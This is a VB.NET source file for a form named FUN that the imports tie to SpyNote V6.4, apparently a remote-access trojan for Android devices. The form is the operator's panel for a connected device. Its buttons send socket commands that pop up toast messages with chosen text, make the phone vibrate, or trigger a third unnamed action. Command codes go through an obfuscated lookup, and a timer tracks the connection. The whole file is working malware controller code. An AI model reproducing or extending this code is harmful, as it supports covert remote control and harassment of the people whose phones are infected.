Imports Microsoft.VisualBasic.CompilerServices
Imports SpyNote_V6._4.SN
Imports SpyNote_V6._4.SN.SpyNote.Stores
Imports SpyNote_V6._4.SN.Sockets.SpyNote.Client

Public Class FUN
    Public TClient As SocketClient
    Private Sub BtnToast_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BtnToast.Click
        Dim text As String = Me.TextToast.Text
        If (text.Trim().Length <> 0) Then
            If (text.Contains("\n")) Then
                text = text.Replace("\n", "" & vbCrLf & "")
            End If
            Me.TClient.Send(String.Concat(Store.BFF(Store.buff, CLng(63)), Data.SplitData, text))
        End If
    End Sub
    Private Sub FUN_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        MyBase.Icon = New System.Drawing.Icon(String.Concat(Store.Resources(1), "\Icons\window\win\26.ico"))
        Me.TProgressBar.Interval = Store.TProgressBarInterval
        Me.TProgressBar.Enabled = True
        Me.Trans.Interval = Store.transparency
        Me.Trans.Enabled = True
        Me.Vib.Text = Me.Track1.Value.ToString()
    End Sub
    Public Sub TData(Ay As Array)
        Try
            Dim left As String = CStr(Ay.GetValue(0))
            Dim flag As Boolean = Operators.CompareString(left, Store.BFF(Store.buff, 83L), False) = 0
            If Not flag Then
                flag = (Operators.CompareString(left, Store.BFF(Store.buff, 84L), False) = 0)
                If flag Then
                End If
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub ThemeButton2_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ThemeButton2.Click
        Me.TClient.Send(String.Concat(Store.BFF(Store.buff, CLng(65)), Data.SplitData, Me.Vib.Text, Data.SplitData))
    End Sub

    Private Sub ThemeButton3_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ThemeButton3.Click
        Me.TClient.Send(String.Concat(Store.BFF(Store.buff, CLng(64)), Data.SplitData))
    End Sub

    Private Sub TProgressBar_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TProgressBar.Tick
        If (Me.TClient Is Nothing) Then
            Me.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(MyBase.Tag, Strings.Space(1)), "-> Connection Lost ..."))
            If (Me.ProgressBar1.Value <> 100) Then
                Me.ProgressBar1.Value = 100
                If (Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)) Then
                    Me.ProgressBar1.Colour0 = Color.FromArgb(128, 128, 128)
                    Me.ProgressBar1.Colour1 = Color.FromArgb(88, 88, 88)
                End If
            End If
        ElseIf (Not Me.TClient.IsClose) Then
            If (Me.Text <> MyBase.Tag) Then
                Me.Text = Conversions.ToString(MyBase.Tag)
            End If
            If (Me.ProgressBar1.Colour1 <> Color.FromArgb(140, 140, 140)) Then
                Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)
                Me.ProgressBar1.Colour0 = Color.FromArgb(140, 140, 140)
            End If
            Me.ProgressBar1.Value = Me.TClient.mProgressBar("Apps", "null")
        Else
            Me.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(MyBase.Tag, Strings.Space(1)), "-> Connection Lost ..."))
            If (Me.ProgressBar1.Value <> 100) Then
                Me.ProgressBar1.Value = 100
                If (Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)) Then
                    Me.ProgressBar1.Colour0 = Color.FromArgb(128, 128, 128)
                    Me.ProgressBar1.Colour1 = Color.FromArgb(88, 88, 88)
                End If
            End If
        End If
    End Sub

    Private Sub Track1_ValueChanged()
        Me.Vib.Text = Me.Track1.Value.ToString()
    End Sub

    Private Sub Trans_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Trans.Tick
        If (MyBase.Opacity = 1) Then
            Me.Trans.Enabled = False
        Else
            MyBase.Opacity = MyBase.Opacity + 0.1
        End If
    End Sub
End Class